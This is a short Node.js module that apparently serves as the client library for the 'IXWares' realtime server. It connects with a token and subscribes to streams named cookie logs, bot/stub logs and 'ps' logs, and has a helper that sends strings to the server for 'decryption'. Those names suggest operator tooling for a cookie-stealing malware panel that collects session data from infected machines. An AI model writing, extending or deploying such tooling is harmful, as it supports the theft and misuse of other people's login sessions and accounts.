var io = require('socket.io-client');
var axios = require('axios');

module.exports = {
    connect: (token) => {

        socket = io("https://ixwhere.online", {
            transports: ["websocket"],
            path: "/realtime/socket.io",
            upgrade: false,
            secure: true,
            reconnection: true,
            forceNew : true,
            query: {
                token: token
            }
        });

        socket.on("connect", function(){
            console.log("Connected to IXWares realtime-server");
        });

        socket.on("connect_error", function(){
            console.log("Failed to connect to IXWares realtime-server (most likely downtime)");
        });
    },
    connectedClients: (callback) => {

        socket.on('connected users', function(result) {
            if(socket.connected === true){
                callback(result);
            }else{
                callback("Not connected");
            }
        });
    },
    cookielog: (callback) => {

        socket.on('cookie-log-update', function(log) {
            if(socket.connected === true){
                callback(log);
            }else{
                callback("Not connected");
            }
        });
    },
    stublog: (callback) => {

        socket.on('bots-log-update', function(log) {
            if(socket.connected === true){
                callback(log);
            }else{
                callback("Not connected");
            }
        });
    },
    pslog: (callback) => {

        socket.on('ps-log-update', function(log) {
            if(socket.connected === true){
                callback(log);
            }else{
                callback("Not connected");
            }
        });
    },
}

async function decrypt(string) {

    const get = await axios.get(`https://ixwhere.online/encrypt?code=${string}`);
    if (get.status == 200) {
        return get.data;
    }else{
        return "ERROR";
    }
}

module.exports.decrypt = decrypt;